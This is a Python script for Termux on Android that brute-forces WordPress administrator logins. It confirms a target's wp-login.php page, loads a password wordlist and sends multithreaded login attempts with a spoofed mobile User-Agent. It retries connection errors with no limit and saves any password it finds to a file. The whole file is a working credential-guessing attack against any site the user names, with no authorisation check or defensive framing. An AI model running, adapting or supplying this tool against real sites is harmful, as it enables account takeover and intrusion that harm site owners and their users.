#!/usr/bin/env python3
# WordPress Bruteforce Script for Android
# Run with Termux: python wp_bruteforce.py

import requests
import sys
import time
import argparse
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init()

def banner():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════╗
║                                                  ║
║  {Fore.RED}██╗    ██╗██████╗ {Fore.GREEN}██████╗ ███████╗{Fore.CYAN}          ║
║  {Fore.RED}██║    ██║██╔══██╗{Fore.GREEN}██╔══██╗██╔════╝{Fore.CYAN}          ║
║  {Fore.RED}██║ █╗ ██║██████╔╝{Fore.GREEN}██████╔╝█████╗{Fore.CYAN}            ║
║  {Fore.RED}██║███╗██║██╔═══╝ {Fore.GREEN}██╔══██╗██╔══╝{Fore.CYAN}            ║
║  {Fore.RED}╚███╔███╔╝██║     {Fore.GREEN}██████╔╝██║{Fore.CYAN}               ║
║   {Fore.RED}╚══╝╚══╝ ╚═╝     {Fore.GREEN}╚═════╝ ╚═╝{Fore.CYAN}               ║
║                                                  ║
║        {Fore.YELLOW}WordPress Bruteforce Tool v1.0{Fore.CYAN}           ║
║        {Fore.YELLOW}For AndroidOS (Termux){Fore.CYAN}                   ║
║                                                  ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

class WordPressBruteforce:
    def __init__(self, url, username, wordlist, threads=4, timeout=10, verbose=False):
        self.url = url if url.endswith('/') else url + '/'
        self.login_url = f"{self.url}wp-login.php"
        self.username = username
        self.wordlist_path = wordlist
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.passwords = []
        self.found = False
        self.attempts = 0
        self.start_time = 0
        
        # User-Agent for requests
        self.user_agent = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
        
        # Check if the WordPress site is reachable
        self.check_target()
        
        # Load the password list
        self.load_wordlist()
    
    def check_target(self):
        """Check if the target WordPress site is reachable"""
        try:
            print(f"{Fore.BLUE}[*] Checking target WordPress site...{Style.RESET_ALL}")
            response = requests.get(self.login_url, timeout=self.timeout, 
                                   headers={"User-Agent": self.user_agent})
            
            if response.status_code == 200 and '<form' in response.text and 'wp-login.php' in response.text:
                print(f"{Fore.GREEN}[+] Target WordPress login page found!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Target does not appear to be a WordPress login page.{Style.RESET_ALL}")
                sys.exit(1)
                
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error connecting to the target: {e}{Style.RESET_ALL}")
            sys.exit(1)
    
    def load_wordlist(self):
        """Load the password list from file"""
        try:
            print(f"{Fore.BLUE}[*] Loading wordlist: {self.wordlist_path}{Style.RESET_ALL}")
            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.GREEN}[+] Loaded {len(self.passwords)} passwords from wordlist{Style.RESET_ALL}")
            
            if not self.passwords:
                print(f"{Fore.RED}[-] Wordlist is empty. Please provide a valid wordlist.{Style.RESET_ALL}")
                sys.exit(1)
                
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Wordlist file not found: {self.wordlist_path}{Style.RESET_ALL}")
            sys.exit(1)
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading wordlist: {e}{Style.RESET_ALL}")
            sys.exit(1)
    
    def try_login(self, password):
        """Try to login with the given password"""
        if self.found:
            return
            
        self.attempts += 1
        
        try:
            # Get the login page first to extract any tokens
            session = requests.Session()
            response = session.get(self.login_url, headers={"User-Agent": self.user_agent}, timeout=self.timeout)
            
            # Prepare the login data
            login_data = {
                'log': self.username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f"{self.url}wp-admin/",
                'testcookie': '1'
            }
            
            # Submit the login form
            response = session.post(
                self.login_url,
                data=login_data,
                headers={
                    "User-Agent": self.user_agent,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": self.login_url
                },
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Calculate elapsed time and rate
            elapsed = time.time() - self.start_time
            rate = self.attempts / elapsed if elapsed > 0 else 0
            
            # Check if login was successful
            if 'wp-admin' in response.url or 'dashboard' in response.url:
                self.found = True
                print(f"\n{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Username: {self.username}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Target: {self.url}{Style.RESET_ALL}")
                
                # Save credentials to file
                with open('wp_cracked.txt', 'a') as f:
                    f.write(f"Site: {self.url}\n")
                    f.write(f"Username: {self.username}\n")
                    f.write(f"Password: {password}\n")
                    f.write("-" * 50 + "\n")
                
                print(f"{Fore.GREEN}[+] Credentials saved to wp_cracked.txt{Style.RESET_ALL}")
                return True
            
            else:
                if self.verbose:
                    print(f"{Fore.RED}[-] Failed: {self.username}:{password}{Style.RESET_ALL}")
                else:
                    # Print status update
                    if self.attempts % 10 == 0:
                        sys.stdout.write(f"\r{Fore.YELLOW}[*] Tried {self.attempts}/{len(self.passwords)} passwords ({rate:.2f} passwords/sec){Style.RESET_ALL}")
                        sys.stdout.flush()
            
        except requests.exceptions.RequestException:
            # Retry on connection error
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Connection error, retrying...{Style.RESET_ALL}")
            time.sleep(2)
            return self.try_login(password)
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        
        return False
    
    def start_attack(self):
        """Start the bruteforce attack using multiple threads"""
        print(f"{Fore.YELLOW}[*] Starting bruteforce attack...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {self.url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Username: {self.username}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Wordlist: {self.wordlist_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Total passwords to try: {len(self.passwords)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}\n")
        
        self.start_time = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(self.try_login, self.passwords)
                
            if not self.found:
                elapsed = time.time() - self.start_time
                print(f"\n{Fore.RED}[-] Attack completed. No valid password found.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Attempted {self.attempts} passwords in {elapsed:.2f} seconds ({self.attempts/elapsed:.2f} passwords/sec){Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack interrupted by user.{Style.RESET_ALL}")
            elapsed = time.time() - self.start_time
            print(f"{Fore.YELLOW}[*] Attempted {self.attempts} passwords in {elapsed:.2f} seconds ({self.attempts/elapsed:.2f} passwords/sec){Style.RESET_ALL}")
            sys.exit(0)


def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WordPress Bruteforce Tool for Android")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL (e.g., http://example.com/)")
    parser.add_argument("-l", "--username", required=True, help="WordPress username to bruteforce")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    try:
        bruteforcer = WordPressBruteforce(
            url=args.url,
            username=args.username,
            wordlist=args.wordlist,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        bruteforcer.start_attack()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Script terminated by user.{Style.RESET_ALL}")
        sys.exit(0)


if __name__ == "__main__":
    main()